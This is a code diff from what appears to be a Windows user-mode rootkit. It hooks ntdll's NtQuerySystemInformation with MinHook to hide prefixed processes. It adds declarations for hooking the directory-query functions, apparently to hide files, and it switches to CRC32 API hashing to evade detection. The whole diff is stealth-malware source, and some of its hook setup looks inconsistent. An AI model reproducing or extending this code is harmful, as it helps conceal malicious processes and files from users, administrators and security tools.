@@ -6,18 +6,58 @@
 #include "vanWin.h"
 #include "TypeDef.h"
 #include "MinHook.h"
-
+#include "ApiHashing.h"
 
 
 fnNtQuerySystemInformation originalNtQuery;
 fnNtQuerySystemInformation newNtQuery;
 
+fnNtQueryDirectoryFile originalNtQueryDir;
+fnNtQueryDirectoryFile newNtQueryDir;
+
+fnNtQueryDirectoryFileEx originalNtQueryDirEx;
+fnNtQueryDirectoryFileEx newNtQueryDirEx;
+
+
+
+
 VOID InitHooks() {
 
     MH_Initialize();
-    InstallHook("NtQuerySystemInformation", &originalNtQuery, &hookedNtQuery, &newNtQuery);
-
+    InstallHook(NtQuerySystemInformation_CRC32, &originalNtQuery, &hookedNtQuery, &newNtQuery);
+    
 }
+
+BOOL InstallHook(LPCSTR function, LPVOID* originalFunction, LPVOID* hookedFunction, LPVOID* newFunction) {
+
+    *originalFunction = GetProcAddressH(GetModuleHandleH(ntdlldll_CRC32), function);
+
+
+    if (MH_CreateHook(originalFunction, &hookedFunction, &newFunction) != MH_OK) {
+        return FALSE;
+    }
+
+    if (MH_EnableHook(originalFunction) != MH_OK) {
+        return FALSE;
+    }
+
+    return TRUE;
+}
+
+BOOL UnHook() {
+
+    if (MH_DisableHook(originalNtQuery) != MH_OK) {
+        return FALSE;
+    }
+
+    if (MH_Uninitialize() != MH_OK) {
+        return FALSE;
+    }
+
+    return TRUE;
+}
+
+
 
 NTSTATUS WINAPI hookedNtQuery(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
     NTSTATUS stat = newNtQuery(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
@@ -46,34 +86,7 @@ NTSTATUS WINAPI hookedNtQuery(SYSTEM_INFORMATION_CLASS SystemInformationClass, P
 }
 
 
-BOOL InstallHook(LPCSTR function, LPVOID* originalFunction, LPVOID* hookedFunction, LPVOID* newFunction) {
 
-    *originalFunction = GetProcAddress(GetModuleHandle(L"NTDLL"), function);
-
-    
-    if (MH_CreateHook(originalFunction, &hookedFunction, &newFunction) != MH_OK) {
-        return FALSE;
-    }
-
-    if (MH_EnableHook(originalFunction) != MH_OK) {
-        return FALSE;
-    }
-
-    return TRUE;
-}
-
-BOOL UnHook() {
-
-    if (MH_DisableHook(originalNtQuery) != MH_OK) {
-        return FALSE;
-    }
-
-    if (MH_Uninitialize() != MH_OK) {
-        return FALSE;
-    }
-
-    return TRUE;
-}
 
 
 BOOL HasPrefix(LPCWSTR str)
